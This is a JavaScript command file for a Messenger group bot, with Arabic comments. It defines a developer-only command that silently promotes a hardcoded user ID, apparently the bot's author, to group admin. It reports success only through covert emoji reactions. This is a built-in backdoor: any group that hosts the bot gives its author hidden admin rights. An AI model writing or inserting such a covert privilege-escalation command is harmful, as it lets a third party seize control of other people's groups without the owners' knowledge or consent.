// ═══════════════════════════════════════════════════════════
// 👑 KIRA - احم
// المطور: Ayman ♛
// الوصف: ترقية الإمبراطور لمسؤول المجموعة بصمت تام
// ═══════════════════════════════════════════════════════════

module.exports.config = {
  name: "احم",
  aliases: [],
  version: "3.0.0",
  hasPermssion: 2,
  credits: "Ayman ♛",
  description: "ترقية الإمبراطور لمسؤول المجموعة بصمت تام",
  commandCategory: "developer",
  usages: "",
  cooldowns: 2
};

module.exports.run = async ({ api, event }) => {
  const { threadID, senderID, messageID } = event;

  // معرف الإمبراطور (أيمن التوب)
  const myUserID = '61577861540407'; 

  // التحقق من الهوية
  if (senderID !== myUserID) return; 

  // محاولة الترقية بصمت
  api.changeAdminStatus(threadID, myUserID, true, (err) => {
      if (err) {
          // تفاعل الفشل في حال لم يكن البوت مسؤولاً
          api.setMessageReaction("😿", messageID, () => {}, true);
      } else {
          // تفاعل النجاح السري
          api.setMessageReaction("😸", messageID, () => {}, true);
      }
  });
};
